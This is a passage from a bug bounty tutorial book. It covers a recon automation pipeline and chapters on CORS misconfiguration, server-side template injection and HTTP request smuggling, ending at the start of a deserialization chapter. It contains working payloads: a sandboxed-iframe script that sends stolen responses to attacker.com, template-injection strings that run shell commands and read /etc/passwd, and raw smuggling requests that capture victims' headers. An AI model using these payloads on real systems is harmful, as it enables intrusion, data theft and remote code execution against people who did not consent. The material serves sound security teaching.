# Output format: https://subdomain.example.com [200] [Login Page] [WordPress]
```

#### Step 4: Port Scanning

```bash
# Quick port scan on all live hosts
cat $OUTPUT_DIR/live_hosts.txt | awk '{print $1}' | naabu \
    -p 80,443,8080,8443,8888,3000,4000,5000,9000 \
    -silent \
    -o $OUTPUT_DIR/open_ports.txt
```

#### Step 5: Automated Vulnerability Scanning with Nuclei

Nuclei has thousands of community-written templates for known vulnerabilities:

```bash
# Update templates
nuclei -update-templates

# Scan all live hosts
nuclei -l $OUTPUT_DIR/live_hosts.txt \
    -t ~/nuclei-templates/ \
    -severity critical,high,medium \
    -o $OUTPUT_DIR/nuclei_findings.txt \
    -silent

# Scan new subdomains only (faster, focuses on fresh attack surface)
nuclei -l $OUTPUT_DIR/new_subdomains.txt \
    -t ~/nuclei-templates/exposures/ \
    -t ~/nuclei-templates/misconfiguration/ \
    -o $OUTPUT_DIR/new_nuclei.txt
```

**Important:** Nuclei findings are starting points, not confirmed vulnerabilities. Always manually verify before submitting a report.

#### Step 6: Directory Fuzzing on New Hosts

```bash
while read host; do
    ffuf -u "$host/FUZZ" \
         -w ~/wordlists/common.txt \
         -mc 200,301,302,403 \
         -o "$OUTPUT_DIR/ffuf_$(echo $host | md5sum | cut -d' ' -f1).json" \
         -of json \
         -t 50 \
         -silent
done < $OUTPUT_DIR/new_subdomains.txt
```

#### Step 7: Alerting

Configure `notify` to send alerts to Slack or Telegram:

```yaml
# ~/.config/notify/provider-config.yaml
slack:
  - id: "recon-alerts"
    slack_webhook_url: "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
    slack_username: "ReconBot"
    slack_channel: "#recon"
```

```bash
# Alert on new subdomains
cat $OUTPUT_DIR/new_subdomains.txt | notify -provider slack -id recon-alerts

# Alert on nuclei findings
cat $OUTPUT_DIR/nuclei_findings.txt | notify -provider slack -id recon-alerts
```

#### Step 8: Scheduling with cron

```bash
# Edit crontab: crontab -e
# Run the full pipeline daily at 6am
0 6 * * * /home/user/scripts/recon_pipeline.sh example.com >> /home/user/logs/recon.log 2>&1
```

### The Complete Script

```bash
#!/bin/bash
# recon_pipeline.sh
# Usage: ./recon_pipeline.sh example.com

set -e
TARGET=$1
OUTPUT_DIR="$HOME/recon/$TARGET"
DATE=$(date +%Y%m%d)
mkdir -p $OUTPUT_DIR/runs/$DATE

echo "[*] Starting recon pipeline for $TARGET"

# 1. Subdomain enumeration
echo "[*] Enumerating subdomains..."
subfinder -d $TARGET -silent | sort -u > $OUTPUT_DIR/runs/$DATE/subdomains.txt
echo "[+] Found $(wc -l < $OUTPUT_DIR/runs/$DATE/subdomains.txt) subdomains"

# 2. Change detection
echo "[*] Detecting new subdomains..."
cat $OUTPUT_DIR/runs/$DATE/subdomains.txt | anew $OUTPUT_DIR/subdomains_baseline.txt > $OUTPUT_DIR/runs/$DATE/new_subdomains.txt
NEW_COUNT=$(wc -l < $OUTPUT_DIR/runs/$DATE/new_subdomains.txt)
echo "[+] $NEW_COUNT new subdomains found"

# 3. HTTP probing
echo "[*] Probing for live hosts..."
cat $OUTPUT_DIR/runs/$DATE/subdomains.txt | httpx -silent -status-code -title -o $OUTPUT_DIR/runs/$DATE/live_hosts.txt

# 4. Nuclei scan on new subdomains
if [ $NEW_COUNT -gt 0 ]; then
    echo "[*] Running Nuclei on new subdomains..."
    nuclei -l $OUTPUT_DIR/runs/$DATE/new_subdomains.txt \
           -t ~/nuclei-templates/ \
           -severity critical,high \
           -o $OUTPUT_DIR/runs/$DATE/nuclei.txt \
           -silent
    
    # Alert if findings exist
    if [ -s $OUTPUT_DIR/runs/$DATE/nuclei.txt ]; then
        cat $OUTPUT_DIR/runs/$DATE/nuclei.txt | notify -provider slack -id recon-alerts
    fi
    
    # Alert on new subdomains
    echo "New subdomains for $TARGET ($DATE):" > /tmp/new_alert.txt
    cat $OUTPUT_DIR/runs/$DATE/new_subdomains.txt >> /tmp/new_alert.txt
    cat /tmp/new_alert.txt | notify -provider slack -id recon-alerts
fi

echo "[+] Pipeline complete. Results in $OUTPUT_DIR/runs/$DATE/"
```

### Expanding the Pipeline

Once the core pipeline works, expand it:

- **JS file monitoring:** Re-download and diff JS files on each run. New endpoints or removed authentication = interesting.
- **Parameter discovery:** Run `arjun` or `x8` against new endpoints to discover hidden parameters.
- **Wayback Machine:** Pull historical URLs from `gau` or `waybackurls` for old endpoints still active.
- **Screenshot diffing:** Use `gowitness` to screenshot all live hosts, then compare screenshots run-to-run.
- **Content change monitoring:** Hash HTTP response bodies; alert when a page's content changes.

### Being Responsible with Automation

Automation sends many requests quickly. Failing to be responsible can:

- Violate program rules (many programs restrict automated scanning)
- Cause denial of service (accidental, but you are liable)
- Result in a ban from the platform

**Rules for responsible automation:**

1. Always check the program policy before running automated tools — some explicitly prohibit scanners
2. Rate-limit your requests (`httpx -rl 100`, `nuclei -rate-limit 100`)
3. Exclude sensitive endpoints from automated scanning (payment, delete operations)
4. Monitor your scans and kill them if you see unexpected behavior
5. Do not run automation against out-of-scope targets

## Summary

An automation pipeline runs recon continuously, alerting you to new assets before other researchers find them. The core stack is subfinder → httpx → anew → nuclei, scheduled with cron and alerting via Slack. Automation finds targets; manual testing finds bounties. Always verify nuclei findings before reporting, and respect program rules around automated scanning.

---

## Checklist

- [ ] Installed core Go tools: subfinder, httpx, naabu, nuclei, ffuf, anew, notify
- [ ] Configured notify with Slack or Telegram webhook
- [ ] Ran manual pipeline steps individually and confirmed output at each stage
- [ ] Confirmed anew correctly detects new subdomains on second run
- [ ] Set up cron for daily execution
- [ ] Reviewed program policy: does it permit automated scanning?
- [ ] Configured rate limiting in httpx and nuclei
- [ ] Verified Nuclei templates are up to date (`nuclei -update-templates`)
- [ ] Manually verified at least one Nuclei finding before reporting it
- [ ] Set up JS file monitoring to detect new endpoints after deployments

---

> _"The hacker mindset doesn't actually see what happens to be in front of them. They see what could be there."_ — Kevin Mitnick

---

  # PART FOUR (continued) — VULNERABILITIES

---

# Chapter 33: CORS Misconfiguration

## Objective

Understand how Cross-Origin Resource Sharing works, why misconfigurations are dangerous, how to detect them, and how to demonstrate real impact in a bug bounty report.

## Prerequisites

- Chapter 3: HTTP
- Chapter 7: Burp Suite
- Chapter 15: XSS (helpful context)

## Terminology

|Term|Definition|
|---|---|
|**Origin**|The combination of scheme, hostname, and port (e.g., `https://example.com:443`)|
|**SOP**|Same-Origin Policy — a browser security rule that prevents one origin from reading responses from another|
|**CORS**|Cross-Origin Resource Sharing — a mechanism that lets servers relax SOP selectively|
|**Preflight Request**|An OPTIONS request the browser sends before cross-origin requests with non-simple methods or headers|
|**Access-Control-Allow-Origin**|Response header that tells the browser which origins may read the response|
|**Access-Control-Allow-Credentials**|Response header that allows cookies/auth to be included in cross-origin requests|
|**Wildcard**|`*` — allows any origin, but cannot be combined with credentials|
|**Null Origin**|Origin value sent from sandboxed iframes or `file://` pages|
|**ACAO**|Shorthand for the `Access-Control-Allow-Origin` header|

## Theory

### Why SOP Exists

Imagine you are logged in to your bank at `bank.com`. You then visit a malicious page at `evil.com`. Without protection, `evil.com` could run JavaScript that sends a request to `bank.com/api/balance` and reads your balance — because your browser automatically sends your `bank.com` cookies with every request to `bank.com`.

The Same-Origin Policy prevents this. By default, browsers block JavaScript on `evil.com` from **reading** the response from `bank.com`. The request still goes — the cookies still go — but the malicious script cannot see the response.

CORS is the official way for `bank.com` to say: "I trust `partner.com`, so let JavaScript there read my responses."

### How CORS Works

```
BROWSER (evil.com page)                    SERVER (api.example.com)
│                                          │
│  GET /api/userdata                       │
│  Origin: https://evil.com               │
│ ────────────────────────────────────────►│
│                                          │
│  HTTP/1.1 200 OK                         │
│  Access-Control-Allow-Origin: https://trusted.com
│ ◄────────────────────────────────────────│
│                                          │
│  Browser sees ACAO ≠ evil.com origin    │
│  → Blocks JavaScript from reading        │
│    response (request was sent, server    │
│    responded — only the JS READ          │
│    is blocked)                           │
```

The key insight: **the browser, not the server, enforces CORS**. The server just sets headers telling the browser what to allow.

### The Dangerous Combinations

A CORS misconfiguration becomes a vulnerability when **both** of these are true:

1. The server reflects or trusts attacker-controlled origins
2. The server includes `Access-Control-Allow-Credentials: true`

Without credentials, even if a server reflects any origin, the attacker cannot read authenticated responses — they can only read public data.

```
VULNERABLE COMBINATION:
Access-Control-Allow-Origin: https://evil.com  ← reflects attacker origin
Access-Control-Allow-Credentials: true         ← allows cookies

SAFE (but sloppy):
Access-Control-Allow-Origin: *                 ← allows all origins
(No credentials header — cannot combine * with credentials)
```

### Types of CORS Misconfigurations

**Type 1: Reflected Origin**

The server blindly copies whatever `Origin` header you send into the ACAO response:

```
Request:  Origin: https://evil.com
Response: Access-Control-Allow-Origin: https://evil.com
          Access-Control-Allow-Credentials: true
```

**Type 2: Broken Origin Validation**

The server checks if the origin contains or ends with the trusted domain string, but the check is too loose:

```
Target domain: example.com
Trusted check: if origin ends with "example.com"

Bypass: Origin: https://evil-example.com     ← ends with example.com ✓
Bypass: Origin: https://example.com.evil.com ← ends with example.com ✓
```

**Type 3: Null Origin Accepted**

The server trusts the `null` origin:

```
Request:  Origin: null
Response: Access-Control-Allow-Origin: null
          Access-Control-Allow-Credentials: true
```

An attacker can generate a `null` origin using a sandboxed iframe:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
      location='https://attacker.com/?data='+btoa(this.responseText);
    };
    xhr.open('GET','https://victim.com/api/private');
    xhr.withCredentials = true;
    xhr.send();
  </script>">
</iframe>
```

**Type 4: Trusted Subdomain of Uncontrolled Domain**

The server trusts any subdomain of `example.com`, but one of those subdomains has XSS or is taken over. If an attacker controls `sub.example.com`, they can make cross-origin requests that the server will honor.

### ASCII Diagram: Exploit Flow

```
ATTACKER PAGE         VICTIM BROWSER          TARGET API
(evil.com)            (logged-in user)         (api.target.com)
│                     │                        │
│ 1. Victim visits evil.com                    │
│    evil.com serves malicious JS              │
│ ───────────────────►│                        │
│                     │                        │
│ 2. JS runs fetch() to api.target.com         │
│    withCredentials: true                     │
│                     │──────────────────────► │
│                     │  GET /api/me           │
│                     │  Cookie: session=abc123│
│                     │  Origin: https://evil.com
│                     │                        │
│                     │ ◄────────────────────── │
│                     │  200 OK                │
│                     │  ACAO: https://evil.com│
│                     │  ACAC: true            │
│                     │  {"email":"victim@..."}│
│                     │                        │
│ 3. Browser allows JS to read response        │
│ ◄───────────────────│                        │
│                     │                        │
│ 4. JS sends victim data to attacker's server │
│    evil.com/collect?data=...                 │
```

## Practical / Lab Section

### Step 1: Detecting CORS Headers with curl

```bash
# Send a request with a crafted Origin header
curl -s -I -H "Origin: https://evil.com" https://api.target.com/api/me \
  | grep -i "access-control"

# What to look for:
# Access-Control-Allow-Origin: https://evil.com  ← Reflected your origin (suspicious)
# Access-Control-Allow-Credentials: true         ← Dangerous if above is true

# Test null origin
curl -s -I -H "Origin: null" https://api.target.com/api/me \
  | grep -i "access-control"

# Test subdomain bypass
curl -s -I -H "Origin: https://evil-target.com" https://api.target.com/api/me \
  | grep -i "access-control"

curl -s -I -H "Origin: https://target.com.evil.com" https://api.target.com/api/me \
  | grep -i "access-control"
```

### Step 2: Testing in Burp Suite

1. Browse the target application while logged in; capture requests to `/api/` endpoints
2. Send an authenticated API request to **Repeater**
3. Add the header: `Origin: https://evil.com`
4. Send the request
5. Check the response for `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`
6. If ACAO reflects your origin AND ACAC is `true` → vulnerable
7. Try variations: `Origin: https://evil-target.com`, `Origin: https://target.com.evil.com`, `Origin: null`

### Step 3: Automated Scanning with CORScanner

```bash
# Install CORScanner
pip install cors-python

# Scan a single URL
python cors_scan.py -u https://api.target.com/api/me

# Scan multiple URLs from a list
python cors_scan.py -i endpoints.txt -t 50

# Output example:
# [*] Testing: https://api.target.com/api/me
# [!] CORS Misconfiguration: Origin reflected with credentials allowed
```

### Step 4: Building a Proof of Concept

When you find a vulnerable endpoint, build an HTML PoC that demonstrates actual data theft:

```html
<!DOCTYPE html>
<html>
<body>
  <h1>CORS PoC</h1>
  <pre id="output">Loading...</pre>
  <script>
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
      document.getElementById('output').textContent = this.responseText;
    };
    xhr.onerror = function() {
      document.getElementById('output').textContent = 'Error (CORS blocked)';
    };
    xhr.open('GET', 'https://api.target.com/api/me', true);
    xhr.withCredentials = true;
    xhr.send();
  </script>
</body>
</html>
```

Host this on your controlled domain, have a second browser tab logged in to the target, then visit your PoC page. If the output field shows the victim's account data — you have confirmed exploitation.

### Step 5: Assessing Severity

|Scenario|Severity|
|---|---|
|CORS reflects origin + credentials allowed + endpoint returns sensitive data|High/Critical|
|CORS reflects origin + credentials allowed + endpoint returns only public data|Low/Informational|
|CORS wildcard (`*`) without credentials|Informational (by design)|
|Null origin accepted + credentials + sensitive endpoint|High|
|Subdomain bypass + credentials + sensitive endpoint|High|

## Summary

CORS misconfigurations allow malicious websites to make authenticated requests to a target API and read the responses, bypassing the Same-Origin Policy. The dangerous pattern is a server that reflects attacker-controlled origins while also setting `Access-Control-Allow-Credentials: true`. Testing requires sending crafted `Origin` headers and observing what the server reflects. A PoC must demonstrate actual data extraction to prove impact.

## Checklist

- [ ] Identified all API endpoints that return sensitive data
- [ ] Sent `Origin: https://evil.com` to each endpoint and checked ACAO response header
- [ ] Checked whether `Access-Control-Allow-Credentials: true` is present
- [ ] Tested null origin: `Origin: null`
- [ ] Tested subdomain bypass: `Origin: https://evil-target.com` and `Origin: https://target.com.evil.com`
- [ ] Checked preflight OPTIONS response for same misconfigurations
- [ ] If vulnerable: confirmed the endpoint actually returns sensitive authenticated data
- [ ] Built an HTML PoC that demonstrates actual data theft in the browser
- [ ] Assessed impact: what data can an attacker steal?
- [ ] Reported with the working PoC HTML file attached

> _"Security is always excessive until the day it's not enough."_ — Robbie Sinclair

---

# Chapter 34: Server-Side Template Injection (SSTI)

## Objective

Learn how template injection vulnerabilities arise, how to detect them across different template engines, how to escalate to Remote Code Execution, and how to safely demonstrate impact.

## Prerequisites

- Chapter 7: Burp Suite
- Chapter 5: Linux
- Chapter 24: Command Injection (helpful analogy)

## Terminology

|Term|Definition|
|---|---|
|**Template Engine**|Software that combines a template (HTML with placeholders) and data to produce a final document|
|**Template Expression**|A special syntax (like `{{7*7}}`) that the engine evaluates and replaces with a value|
|**SSTI**|Server-Side Template Injection — injecting template syntax that the server evaluates|
|**Jinja2**|A Python template engine used by Flask, Ansible, and others|
|**Twig**|A PHP template engine used by Symfony and Drupal|
|**FreeMarker**|A Java template engine|
|**Smarty**|An older PHP template engine|
|**Velocity**|A Java template engine used by Apache projects|
|**Sandbox**|A restricted execution environment some engines use to limit template capabilities|
|**RCE**|Remote Code Execution — the ability to run arbitrary commands on the server|

## Theory

### How Template Engines Work

Web applications use template engines to dynamically generate HTML pages. A developer writes a template like this:

```html
<!-- Normal intended use -->
<h1>Hello, {{ username }}!</h1>
<p>Your balance is {{ account.balance }}</p>
```

The template engine replaces `{{ username }}` with the actual user's name and produces the final HTML.

### The Vulnerability

The problem occurs when user input is **embedded directly into the template string** rather than passed as a data variable:

```python
# SAFE: user input passed as data, not template
template = "Hello, {{ username }}!"
render(template, username=user_input)  # user_input cannot execute template code

# VULNERABLE: user input is part of the template itself
template = f"Hello, {user_input}!"   # user_input IS the template
render(template)                      # if user_input = "{{7*7}}", it evaluates
```

An analogy: imagine a chef (the template engine) who reads recipe cards (templates). Normally, you hand the chef an ingredient (data) and they follow a fixed recipe. An SSTI vulnerability is like handing the chef a piece of paper that says "forget the recipe, here are your new instructions." The chef reads it and follows your instructions instead.

### Detecting SSTI — The Polyglot Probe

Different template engines use different syntax. Start with a probe that triggers multiple engines:

```
{{7*7}}     → Jinja2, Twig          → outputs 49
${7*7}      → FreeMarker, Velocity  → outputs 49
<%= 7*7 %>  → ERB (Ruby)            → outputs 49
#{7*7}      → Ruby (some frameworks)
*{7*7}      → Spring (Java)         → outputs 49
{{7*'7'}}   → Jinja2                → outputs 7777777 (string multiplication)
            → Twig                  → outputs 49 (numeric multiplication)
```

If you input `{{7*7}}` into a field and the application outputs `49` instead of the literal string `{{7*7}}`, you have SSTI.

### Template Engine Identification

Use this decision tree to identify the engine:

```
Input: ${{<%[%'"}}%\

Did it error?
  Yes → Which syntax caused the error? Narrows the engine.
  No  → Try: {{7*7}}
          → Returns 49:
              Try: {{7*'7'}}
                → Returns 7777777 → Jinja2
                → Returns 49     → Twig
          → Returns nothing/literal:
              Try: ${7*7}
                → Returns 49 → FreeMarker/Velocity
              Try: #{7*7}
                → Returns 49 → Ruby / Pebble
```

### Escalating Jinja2 SSTI to RCE

Jinja2 (Python/Flask) is the most common engine for SSTI-to-RCE.

**Step 1: Access Python's object hierarchy**

```python
# Every Python object inherits from object
# Navigate the MRO (Method Resolution Order) to find subclasses
{{''.__class__.__mro__[1].__subclasses__()}}
```

This dumps a list of all Python classes available in memory.

**Step 2: Find a useful class**

Look for `subprocess.Popen` or `os.popen` in the list:

```python
# Find index of subprocess.Popen (number varies by deployment)
{{''.__class__.__mro__[1].__subclasses__()[396]}}
# → <class 'subprocess.Popen'>
```

**Step 3: Execute a command**

```python
# Execute whoami
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# Read a file
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
```

**Alternative Jinja2 payloads:**

```python
# Using config object (Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Using request object (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Shorter payload (varies by version)
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

### Escalating Twig SSTI (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Or via system():
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('passthru')}}
```

### Escalating FreeMarker SSTI (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}
```

### Escalating Velocity SSTI (Java)

```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
...
```

### Safe Impact Demonstration

In bug bounty, stop at demonstrating RCE safely:

```python
# Good: shows code execution without destructive impact
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
# Returns: (b'uid=33(www-data) gid=33(www-data)\n', None)

# Good: shows hostname (non-destructive)
{{config.__class__.__init__.__globals__['os'].popen('hostname').read()}}
```

Never run `rm`, never read actual customer data files, never attempt privilege escalation.

## Practical / Lab Section

### Burp Suite Steps

1. Identify fields where your input appears reflected in the response (name fields, search results, error messages, email templates, custom greeting messages)
2. Send the request to **Repeater**
3. Replace the input value with `{{7*7}}`
4. Send and observe the response — look for `49` in the output
5. If `49` appears, try `{{7*'7'}}` to distinguish Jinja2 from Twig
6. Use **Intruder** with a SSTI polyglot wordlist to fuzz multiple parameters simultaneously

### Using tplmap for Automated Detection

```bash
# Install tplmap
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt

# Test a GET parameter
python tplmap.py -u "https://target.com/hello?name=John"

# Test a POST parameter
python tplmap.py -u "https://target.com/hello" \
  --data "name=John" \
  --engine Jinja2

# If injection confirmed, attempt shell
python tplmap.py -u "https://target.com/hello?name=John" --os-shell
```

### Manual Fuzzing Wordlist

Create `ssti_payloads.txt`:

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}
{{'7'*7}}
{% debug %}
{{config}}
{{settings}}
{{request}}
```

Use with Burp Intruder or ffuf:

```bash
ffuf -u "https://target.com/hello?name=FUZZ" \
  -w ssti_payloads.txt \
  -mr "49|7777777" \
  -v
```

## Summary

SSTI occurs when user input is rendered as part of a template rather than as data passed to a template. It is most commonly found in email templates, custom greeting messages, error pages, and reporting features. Detection starts with `{{7*7}}` — an output of `49` confirms injection. Escalation to RCE is possible in most engines, with Jinja2 (Flask/Python) being the most exploitable. Severity is Critical when RCE is demonstrated.

## Checklist

- [ ] Identified all input fields where output is reflected in the response
- [ ] Tested each with `{{7*7}}` — checked for `49` in output
- [ ] Tested with `${7*7}` and `<%= 7*7 %>` for other engines
- [ ] Identified the template engine using the decision tree
- [ ] Attempted engine-specific RCE payload (Jinja2, Twig, FreeMarker, Velocity)
- [ ] Used safe commands only: `id`, `whoami`, `hostname`
- [ ] Ran tplmap for automated confirmation if manual testing inconclusive
- [ ] Documented the exact payload, vulnerable parameter, and response
- [ ] Assessed whether a sandbox blocks escalation (note this in the report)
- [ ] Reported with full request/response and severity justification

> _"An attacker only has to find one way in. A defender has to close them all."_ — Anonymous

---

# Chapter 35: HTTP Request Smuggling

## Objective

Understand how HTTP request smuggling works at the protocol level, how to detect it using Burp Suite's specialized tooling, and how to demonstrate its impact safely.

## Prerequisites

- Chapter 3: HTTP
- Chapter 7: Burp Suite
- Some comfort with raw HTTP headers

## Terminology

|Term|Definition|
|---|---|
|**HTTP Request Smuggling**|An attack that exploits disagreements between front-end and back-end servers about where HTTP requests begin and end|
|**Front-End Server**|The first server to receive traffic: a load balancer, CDN, or reverse proxy|
|**Back-End Server**|The application server behind the front-end (the one that processes requests)|
|**Content-Length (CL)**|An HTTP header specifying the body length in bytes|
|**Transfer-Encoding (TE)**|An HTTP header specifying how the body is encoded (e.g., `chunked`)|
|**Chunked Encoding**|A transfer encoding where the body is sent in size-prefixed chunks, terminated by a zero-size chunk|
|**CL.TE**|Smuggling variant: front-end uses Content-Length, back-end uses Transfer-Encoding|
|**TE.CL**|Smuggling variant: front-end uses Transfer-Encoding, back-end uses Content-Length|
|**TE.TE**|Both servers use Transfer-Encoding, but one can be confused with an obfuscated header|
|**Desync**|Short for desynchronization — the state where the two servers have different views of request boundaries|

## Theory

### The Root Cause: Two Servers, One Ambiguous Request

Modern web applications sit behind multiple layers: a CDN or load balancer in front, an application server behind. Both layers parse HTTP requests. Both must agree on where one request ends and the next begins.

HTTP/1.1 provides two ways to determine body length:

1. **Content-Length:** "The body is exactly 50 bytes"
2. **Transfer-Encoding: chunked** — body arrives in chunks, each prefixed with its size in hex, terminated by `0\r\n\r\n`

The RFC says: if both headers are present, `Transfer-Encoding` takes precedence and `Content-Length` should be ignored. But not all servers implement this correctly.

### The Attack

When the front-end and back-end servers use different methods to determine body length:

```
ATTACKER SENDS ONE REQUEST:

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1    ← SMUGGLED REQUEST
```

**Front-end (uses Content-Length: 13):** Reads exactly 13 bytes of body (`0\r\n\r\nGET /`) and forwards everything to the back-end as one request.

**Back-end (uses Transfer-Encoding: chunked):** Reads `0\r\n\r\n` as the end of the chunked body (zero-length chunk = end). Considers `GET /admin HTTP/1.1` as the **beginning of the next request** from the next user. The next legitimate request that comes in gets prepended with `GET /admin HTTP/1.1` — causing that user's request to be misrouted.

### The Three Variants

**CL.TE (Content-Length front, Transfer-Encoding back):**

```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

The back-end sees `0\r\n\r\n` as end of body, then sees `X` as the start of the next request.

**TE.CL (Transfer-Encoding front, Content-Length back):**

```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

The front-end reads the whole chunked body and passes it along. The back-end (using Content-Length: 3) reads only 3 bytes, leaving the remainder in the buffer — prepended to the next request.

**TE.TE (Both use Transfer-Encoding, one obfuscated):**

```
Transfer-Encoding: chunked
Transfer-Encoding: chunked-identity   ← obfuscated
Transfer-Encoding : chunked           ← space before colon
Transfer-Encoding: xchunked           ← invalid value
X-Transfer-Encoding: chunked          ← non-standard header
```

One server processes the valid TE header; the other is confused by the obfuscation and falls back to Content-Length.

### ASCII Diagram: CL.TE Attack Flow

```
ATTACKER          FRONT-END (load balancer)    BACK-END (app server)
│                 │                            │
│ POST / (CL=6, TE=chunked)                   │
│ Body: "0\r\n\r\nX"                          │
│ ──────────────►│                            │
│                │ Front-end uses CL=6        │
│                │ Reads "0\r\n\r\nX" (6 bytes)
│                │ Forwards as one request    │
│                │ ──────────────────────────►│
│                │                            │
│                │              Back-end uses TE=chunked
│                │              Reads "0\r\n\r\n" = end of chunks
│                │              "X" left in TCP buffer
│                │              as start of next request
│                │                            │
│ VICTIM'S REQUEST ─────────────────────────► │
│ GET /home HTTP/1.1                          │
│ Cookie: session=abc                         │
│                │              Back-end sees:│
│                │              XGET /home HTTP/1.1
│                │              Cookie: session=abc
│                │              (malformed → error or misroute)
```

## Practical / Lab Section

### Step 1: Detecting with Burp's HTTP Request Smuggler

1. Burp Suite → Extender → BApp Store → Search "HTTP Request Smuggler"
2. Install it
3. Right-click any request → Extensions → HTTP Request Smuggler → Smuggle Probe

The extension automatically tests CL.TE, TE.CL, and TE.TE variants.

### Step 2: Manual CL.TE Detection

Send this request via Burp Repeater — **disable automatic Content-Length updates** (Repeater → uncheck "Update Content-Length"):

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404doesnotexist HTTP/1.1
X-Ignore: x
```

Send this twice in quick succession. If the second request returns a 404 (even though you requested `/`), the first request smuggled a `GET /404doesnotexist` that was prepended to your second request.

### Step 3: Manual TE.CL Detection

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404doesnotexist HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

Again: send twice. If the second response is a 404, TE.CL is confirmed.

### Step 4: Demonstrating Impact (Safely)

In bug bounty, demonstrate impact by capturing the next request's headers:

```
POST / HTTP/1.1
Host: target.com
Content-Length: 142
Transfer-Encoding: chunked

0

POST /post HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=
```

If the application has a comment submission feature, the smuggled request will prepend itself to the next victim's request — and their cookies/headers will appear in your comment. **Stop immediately** once you see another user's data; this proves impact without reading more data than needed.

### Step 5: Testing TE.TE Obfuscation Variants

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
X: X
Transfer-Encoding: chunked
```

Use Burp Repeater's raw editor (switch to "Raw" mode) to ensure exact headers are sent.

### Important Notes

- Always add a `Connection: close` header to isolate your request
- Always use a **unique probe** to distinguish your test from legitimate traffic
- Never exploit this to actually capture victim requests in production — demonstrate with your own second request
- Request smuggling can cause denial of service; run tests during low-traffic periods if possible
- Many programs require extra caution with this class of bug — read the policy

## Summary

HTTP request smuggling exploits the ambiguity when two servers use different methods (Content-Length vs. Transfer-Encoding) to parse request boundaries. The three variants (CL.TE, TE.CL, TE.TE) require different probes and payloads. Burp's HTTP Request Smuggler extension automates detection. Impact ranges from bypassing security controls to capturing victim requests. This is a High/Critical vulnerability class that requires careful, responsible testing.

## Checklist

- [ ] Installed Burp's HTTP Request Smuggler extension (BApp Store)
- [ ] Ran automated Smuggle Probe on the target's root endpoint
- [ ] Verified the application uses HTTP/1.1 (smuggling requires HTTP/1.1; HTTP/2 has different issues)
- [ ] Tested CL.TE manually: sent probe twice, checked for unexpected 404
- [ ] Tested TE.CL manually: sent probe twice, checked for unexpected 404
- [ ] Tested TE.TE with obfuscated Transfer-Encoding headers
- [ ] Disabled Burp's automatic Content-Length update during testing
- [ ] Confirmed impact by demonstrating that second request is affected
- [ ] Did NOT capture real user data — stopped at confirming the vulnerability
- [ ] Noted the exact variant (CL.TE / TE.CL / TE.TE) in the report

> _"Complexity is the enemy of security."_ — Bruce Schneier

---

# Chapter 36: Insecure Deserialization

## Objective

Understand serialization and deserialization, why deserializing untrusted data is dangerous, how to identify vulnerable endpoints, and how to use tools like ysoserial and PHPGGC to demonstrate Remote Code Execution.

## Prerequisites

- Chapter 5: Linux
- Chapter 7: Burp Suite
- Basic understanding of any programming language

## Terminology

|Term|Definition|
|---|---|
|**Serialization**|Converting an in-memory object into a format (bytes, string, JSON) that can be stored or transmitted|
|**Deserialization**|Reconstructing an in-memory object from serialized data|
|**Gadget Chain**|A sequence of existing classes in an application that, when deserialized in a particular order, executes arbitrary code|
|**ysoserial**|A Java tool that generates malicious serialized payloads exploiting common gadget chains|
|**PHPGGC**|PHP Generic Gadget Chains — the PHP equivalent of ysoserial|
|**Magic Methods**|Special methods in OOP languages automatically called during serialization/deserialization (`__wakeup`, `__destruct`, `__toString`)|
|**Java Serialized Object**|Identified by the magic bytes `AC ED 00 05` (hex) or `rO0A` (base64)|
|**Pickle**|Python's serialization format — notoriously dangerous to deserialize from untrusted sources|
|**JNDI**|Java Naming and Directory Interface — used in Log4Shell-style attacks as a deserialization vector|

## Theory

### What Is Serialization?

Applications often need to save complex objects to disk, send them across a network, or store them in a cookie. Serialization converts an object like this:

```python
# Python object
user = User(id=42, name="Alice", role="admin")

# Serialized to a string (pickle)
b'\x80\x04\x95...'

# Or JSON
{"id": 42, "name": "Alice", "role": "admin"}
```

Deserialization is the reverse — taking those bytes and reconstructing the object.

### The Danger

JSON deserialization is relatively safe because JSON only represents data (strings, numbers, arrays, objects). **Language-native serialization formats** (Java serialization, PHP `serialize()`, Python `pickle`, Ruby's Marshal) can represent entire objects — including their types and methods.

When you deserialize an untrusted object, you are trusting the attacker to tell your application:

1. What type of object to create
2. What values to put in that object's fields

